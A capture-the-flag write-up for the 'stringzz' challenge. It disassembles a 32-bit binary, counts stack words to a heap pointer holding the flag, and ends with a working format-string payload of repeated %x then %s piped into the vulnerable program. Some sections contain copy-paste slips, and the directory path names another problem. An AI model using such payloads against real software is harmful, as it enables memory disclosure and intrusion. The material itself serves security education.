# stringzz
In this problem, we need to understand format string and the mechanism with printf function.

Read the Format_String.pdf in directory. We will know that even printf function will obtain value from stack if variables corresponding to format stringwere not offered.

Therefore, we can control the number of format strings and then is able to print the content in certain address in stack, or even modify value in certain position in stack.

Check the security of the binary:
```
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```
Canary is enabled, therefore, write to stack will be difficult.

First, look at the vuln.c and we found that vuln will load the content of the flag.txt into heap by malloc. Therefore, if we can obtain the address of the flag content, which is stored in stack, we can use printf function to print the content of flag.

Now, the problem will is that how many format string should we input? On the other way, where is the distance from printf function stack position to the address of the flag content.

We can calculate this distance by looking into the assembly code.

We can use ghidra or gdb. 

The call graph of the printf function will be:
```
main >>> printMessage1 >>> printMessage2 >>> printMessage3 >>> printf
```
We divide the stack into four parts, each part correspond to four function call.

We start from printMessage3.
```
0x000006ed <+0>:	push   ebp
0x000006ee <+1>:	mov    ebp,esp
0x000006f0 <+3>:	push   ebx
0x000006f1 <+4>:	sub    esp,0x4
0x000006f4 <+7>:	call   0x5f0 <__x86.get_pc_thunk.bx>
0x000006f9 <+12>:	add    ebx,0x18bb
0x000006ff <+18>:	sub    esp,0xc
0x00000702 <+21>:	lea    eax,[ebx-0x1684]
0x00000708 <+27>:	push   eax
0x00000709 <+28>:	call   0x570 <puts@plt>
0x0000070e <+33>:	add    esp,0x10
0x00000711 <+36>:	sub    esp,0xc
0x00000714 <+39>:	push   DWORD PTR [ebp+0x8]
0x00000717 <+42>:	call   0x520 <printf@plt>
...
```
First, printMessage3 function push its ebp value into stack, and push ebx into stack, esp value is changed by esp-8.

In the following instructions esp value continue changing by -0xc + 0x10 - 0xc - 0x4 = -0xc.

The operation push eax should be ignored because it is the argument for the puts function call and will not effect esp.

Before calling printf function, the address of input string is pushed into stack, which means esp-4.(here, will be top of stack)

Therefore, the total stack length(bytes) will be 4(address of input string) + 12(0xc, changing before printf function call) + 4(push ebx) + 4(push ebp) + 4(canary) + 4(return address).
```
stack when calling printf
printMessage3 part
                       low
-----------------------
address of input string <- esp
-----------------------
4 bytes
-----------------------
4 bytes
-----------------------
4 bytes
-----------------------
ebx
-----------------------
canary
-----------------------
ebp
-----------------------
ret
-----------------------high

From esp, there are 7 (4 bytes)
``` 
printMessage2
```
0x00000725 <+0>:	push   ebp
0x00000726 <+1>:	mov    ebp,esp
0x00000728 <+3>:	push   ebx
0x00000729 <+4>:	sub    esp,0x4
0x0000072c <+7>:	call   0x884 <__x86.get_pc_thunk.ax>
0x00000731 <+12>:	add    eax,0x1883
0x00000736 <+17>:	sub    esp,0xc
0x00000739 <+20>:	lea    edx,[eax-0x1672]
0x0000073f <+26>:	push   edx
0x00000740 <+27>:	mov    ebx,eax
0x00000742 <+29>:	call   0x570 <puts@plt>
0x00000747 <+34>:	add    esp,0x10
0x0000074a <+37>:	sub    esp,0xc
0x0000074d <+40>:	push   DWORD PTR [ebp+0x8]
0x00000750 <+43>:	call   0x6ed <printMessage3>
...
```
The printMessage3 function push its ebp value into stack, and push ebx into stack, esp value is changed by esp-8.
  
In the following instructions esp value continue changing by -0xc + 0x10 - 0xc - 0x4 = -0xc.

The operation push eax should be ignored because it is the argument for the puts function call and will not effect esp.
  
Before calling printMessage3 function, the address of input string is pushed into stack, which means esp-4.(here, will be top of stack)

Therefore, the total stack length(bytes) will be 4(address of input string) + 12(0xc, changing before printf function call) + 4(push ebx) + 4(push ebp) + 4(canary) + 4(return address).
```
stack when calling printf

printMessage3 part     low
-----------------------
printMessage3 argument
-----------------------
4 bytes
-----------------------
4 bytes
-----------------------
4 bytes
-----------------------
ebx
-----------------------
canary
-----------------------
ebp
-----------------------
ret
-----------------------high

printMassage2 part has 8 (4 bytes)
```
printMessage1 is same as printMessage1.
```
stack when calling printf

printMessage2 part     low
-----------------------
printMessage2 argument
-----------------------
4 bytes
-----------------------
4 bytes
-----------------------
4 bytes
-----------------------
ebx
-----------------------
canary
-----------------------
ebp
-----------------------
ret
-----------------------high

printMassage1 part has 8 (4 bytes)

```
In main function:
```
0x00000797 <+0>:	lea    ecx,[esp+0x4]
0x0000079b <+4>:	and    esp,0xfffffff0
0x0000079e <+7>:	push   DWORD PTR [ecx-0x4]
0x000007a1 <+10>:	push   ebp
0x000007a2 <+11>:	mov    ebp,esp
0x000007a4 <+13>:	push   ebx
0x000007a5 <+14>:	push   ecx
0x000007a6 <+15>:	sub    esp,0x30
0x000007a9 <+18>:	call   0x5f0 <__x86.get_pc_thunk.bx>
0x000007ae <+23>:	add    ebx,0x1806
0x000007b4 <+29>:	mov    eax,ecx
0x000007b6 <+31>:	mov    eax,DWORD PTR [eax+0x4]
0x000007b9 <+34>:	mov    DWORD PTR [ebp-0x2c],eax
0x000007bc <+37>:	mov    eax,gs:0x14
0x000007c2 <+43>:	mov    DWORD PTR [ebp-0xc],eax
0x000007c5 <+46>:	xor    eax,eax
0x000007c7 <+48>:	sub    esp,0xc
0x000007ca <+51>:	lea    eax,[ebx-0x1660]
0x000007d0 <+57>:	push   eax
0x000007d1 <+58>:	call   0x570 <puts@plt>
0x000007d6 <+63>:	add    esp,0x10
0x000007d9 <+66>:	mov    DWORD PTR [ebp-0x18],0x0
0x000007e0 <+73>:	mov    eax,DWORD PTR [ebx+0x3c]
0x000007e6 <+79>:	mov    eax,DWORD PTR [eax]
0x000007e8 <+81>:	sub    esp,0x4
0x000007eb <+84>:	push   eax
0x000007ec <+85>:	lea    eax,[ebp-0x1c]
0x000007ef <+88>:	push   eax
0x000007f0 <+89>:	lea    eax,[ebp-0x18]
0x000007f3 <+92>:	push   eax
0x000007f4 <+93>:	call   0x510 <getline@plt>
0x000007f9 <+98>:	add    esp,0x10
0x000007fc <+101>:	sub    esp,0xc
0x000007ff <+104>:	push   0x80
0x00000804 <+109>:	call   0x560 <malloc@plt>
0x00000809 <+114>:	add    esp,0x10
0x0000080c <+117>:	mov    DWORD PTR [ebp-0x14],eax
0x0000080f <+120>:	sub    esp,0x8
0x00000812 <+123>:	lea    eax,[ebx-0x1621]
0x00000818 <+129>:	push   eax
0x00000819 <+130>:	lea    eax,[ebx-0x161f]
0x0000081f <+136>:	push   eax
0x00000820 <+137>:	call   0x590 <fopen@plt>
0x00000825 <+142>:	add    esp,0x10
0x00000828 <+145>:	mov    DWORD PTR [ebp-0x10],eax
0x0000082b <+148>:	sub    esp,0x4
0x0000082e <+151>:	push   DWORD PTR [ebp-0x10]
0x00000831 <+154>:	push   0x80
0x00000836 <+159>:	push   DWORD PTR [ebp-0x14]
0x00000839 <+162>:	call   0x540 <fgets@plt>
0x0000083e <+167>:	add    esp,0x10
0x00000841 <+170>:	mov    eax,DWORD PTR [ebp-0x18]
0x00000844 <+173>:	sub    esp,0xc
0x00000847 <+176>:	push   eax
0x00000848 <+177>:	call   0x75e <printMessage1>
...
```
The main function push (DWORD PTR [ecx-0x4]), and its ebp value into stack, and push ebx, and ecx into stack, esp value is changed by esp-16.
   
In the following instructions esp value continue changing by -0x30 - 0xc + 0x10 - 0x4 + 0x10 - 0xc + 0x10 - 0x8 + 0x10 - 0x4 + 0x10 - 0xc = -0x14.

The push operation for call function's argument should be ignored.

Before calling printMessage1 function, the address of input string is pushed into stack, which means esp-4.

we use ghidra to see the main function, and found that there are 3 local variables(4 bytes) before buf.(since stack is first in last out to to match the order the last declare variable will be pushed into stack first). Therefore, these 3 local variables declared before buf will be pushed into stack after buf.

The total stack length(bytes) will be 4(argument for printMessage1) + 20(0x14, changing before printf function call) + 8(push ebx, push ecx) + 4(push ebp) + 4(push DWORD PTR [ecx-0x4]) + 12(local variables) + 4(buf, the pointer point to the content of flag).
```
stack when calling printf
 
printMessage1 part     low
-----------------------
printMessage1 argument
-----------------------
4 bytes
-----------------------
4 bytes
-----------------------
4 bytes
-----------------------
4 bytes
-----------------------
4 bytes
-----------------------
ecx
-----------------------
ebx
-----------------------
ebp
-----------------------
DWORD PTR [ecx-0x4]
-----------------------
read
-----------------------
len
-----------------------
input
-----------------------
buf
-----------------------high

main part has 14 (4 bytes) 
```
Combine printMessage1, printMessage2, printMessage3, main parts, total stack length will be 7 + 8 + 8 + 14 = 37.
```
cd /problems/got_5_c5119617c90aa544a639812dbc41e24e 
python2 -c "print '\x20\x25\x78\x20'*36 + '\x20\x25\x73\x20'" | ./vuln
```
